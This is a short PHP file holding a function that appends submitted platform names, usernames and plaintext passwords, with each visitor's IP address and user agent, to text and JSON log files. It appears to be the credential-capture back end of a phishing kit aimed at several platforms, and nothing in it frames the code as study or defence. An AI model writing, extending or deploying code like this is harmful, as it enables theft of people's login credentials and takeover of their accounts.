<?php
function saveCredentials($platform, $username, $password) {
    $log_file = __DIR__ . '/../logs/credentials.txt';
    
    $data = [
        'timestamp' => date('Y-m-d H:i:s'),
        'platform' => $platform,
        'username' => $username,
        'password' => $password,
        'ip' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT']
    ];
    
    $formatted = str_repeat("=", 50) . "\n";
    $formatted .= "PLATFORM: " . strtoupper($platform) . "\n";
    $formatted .= "TIME: " . $data['timestamp'] . "\n";
    $formatted .= "IP: " . $data['ip'] . "\n";
    $formatted .= "USERNAME: " . $username . "\n";
    $formatted .= "PASSWORD: " . $password . "\n";
    $formatted .= "USER-AGENT: " . $data['user_agent'] . "\n";
    $formatted .= str_repeat("=", 50) . "\n\n";
    
    file_put_contents($log_file, $formatted, FILE_APPEND);
    
    // JSON format में भी सेव करें
    $json_file = __DIR__ . '/../logs/credentials.json';
    file_put_contents($json_file, json_encode($data) . "\n", FILE_APPEND);
    
    return true;
}
?>
